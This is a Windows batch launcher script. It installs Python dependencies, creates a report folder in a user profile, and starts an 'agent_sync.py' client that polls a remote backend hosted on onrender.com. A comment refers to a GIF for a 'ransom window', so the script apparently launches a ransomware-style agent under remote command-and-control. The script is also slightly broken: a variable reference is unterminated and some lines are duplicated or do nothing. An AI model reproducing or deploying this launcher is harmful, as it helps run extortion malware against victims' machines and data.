@echo off
setlocal enableextensions
@echo off
setlocal ENABLEDELAYEDEXPANSION

rem Change to the directory of this script so relative paths work
cd /d "%~dp0"

rem Ensure Python and dependencies
if exist .venv\Scripts\python.exe (
  set "PY=.venv\Scripts\python.exe"
) else (
  set "PY=python"
)

set "REQ=%~dp0requirements.txt"
"%PY%" -m pip install -r "%REQ%" || (
  echo pip install failed
  pause
  exit /b 1
)

set "BACKEND_REPORT_DIR=C:\Users\user\report"
if not exist "%BACKEND_REPORT_DIR%" (
  mkdir "%BACKEND_REPORT_DIR%" >nul 2>&1
)
set "REPORT_DIR=%BACKEND_REPORT_DIR%"

set "BACKEND_URL=https://sample-2ang.onrender.com"

rem Flags
set "FLAGS=--polling --debug"

rem Default agent path relative to this script unless an explicit path is provided as %1
set "AGENT=%~1"
if "%AGENT%"=="" set "AGENT=%~dp0py_simple\agent_sync.py"

"%PY%" "%AGENT%" --backend "%BACKEND_URL" %FLAGS%

rem If a local packaged GIF exists, pass it via env for the ransom window
set "LOCAL_GIF_PATH=%~dp0py_simple\assets\warning.gif"
if exist "%LOCAL_GIF_PATH%" (
  set "LOCAL_GIF_PATH=%LOCAL_GIF_PATH%"
)

pause
